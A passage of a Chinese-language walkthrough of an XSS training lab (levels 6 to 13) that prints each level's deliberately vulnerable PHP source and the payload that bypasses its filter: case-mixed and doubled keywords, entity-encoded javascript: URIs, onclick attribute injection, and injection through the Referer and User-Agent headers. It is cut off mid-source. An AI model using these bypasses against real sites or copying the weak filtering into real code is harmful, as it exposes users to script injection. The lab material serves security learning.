6</h3><p>经过尝试,虽然符号没被实体化,但多过滤了href,src等关键词</p><p>通过查阅资料,尝试了一下大写的herf,结果成功了,下面给出payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a hRef=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)<span class="string">&quot;&gt;link&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>经过尝试上一关的语句,发现href和script部分被检测到后被删掉了,那我们可以尝试双写绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a hrhrefef=&quot;</span><span class="attr">javascrscriptipt</span>:<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)<span class="string">&quot;&gt;link&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>经过尝试发现输入的部分会被引用在友情链接的href部分,但过滤很严格,基本之前的绕过方法都不管用了</p><p>那么我们可以尝试使用html实体编码把js伪协议部分编码的值输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span></span><br></pre></td></tr></table></figure><p>这样前端接收到我们的内容会自动解码成代码并执行,并且成功绕过检测</p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>和上题大致但过滤更为严格,html编码无法使用,那么我们查看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level10.php?keyword=well done!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们发现需要在输入中携带http://</span><br><span class="line"></span><br><span class="line">那么我们可以尝试把http://部分放在js伪协议后面使js且能绕过,但需要和前面部分进行隔断</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>//http://</span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>这关通过看网页源代码有发现隐藏的表单部分,并且通过尝试发现依旧过滤了一些符号,可以先看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>不难发现我们要传t_sort变量使输入的值会出现在第三个input部分,但是尖括号被过滤我们无法闭合input标签</p><p>那么我们可以尝试注释掉后半部分的hidden类型,并且注入一个新的text类型,即这样的一个过程:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&#x27; &#x27;&quot;</span>onclick=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>) type=<span class="string">&quot;text&quot;</span> <span class="comment">//&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>则payload为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=<span class="string">&#x27;&quot;onclick=alert(1) type=&quot;text&quot; //</span></span><br></pre></td></tr></table></figure><p>这样输入框就展现出来了,点击输入框后成功执行js语句,完成此关</p><h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>类似于上一道,依旧有隐藏的表单部分,先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level12.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>经过搜索,发现&amp;_SERVE接收的是上个网页的url,并且接收的是请求头部分的Referer内容</p><p>那么我们可以在Referer部分构造和上关一样的payload尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27;&quot;onclick=alert(1) type=&quot;text&quot; //</span></span><br></pre></td></tr></table></figure><p>成功,进入下一关</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>还是直接来看下源码吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level13.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>和上题形式一样,只不过$_SERVER部分由User-Agent部分接收值了</p><p>那就在此部分构造同意的payload尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: <span class="string">&#x27;&quot;onclick=alert(1) type=&quot;text&quot; //</span></span><br></pre></td></tr></table></figure><p>没什么问题,通过</p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>发现又是差不多类型的题,还是先看看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level14.php&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level13&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span 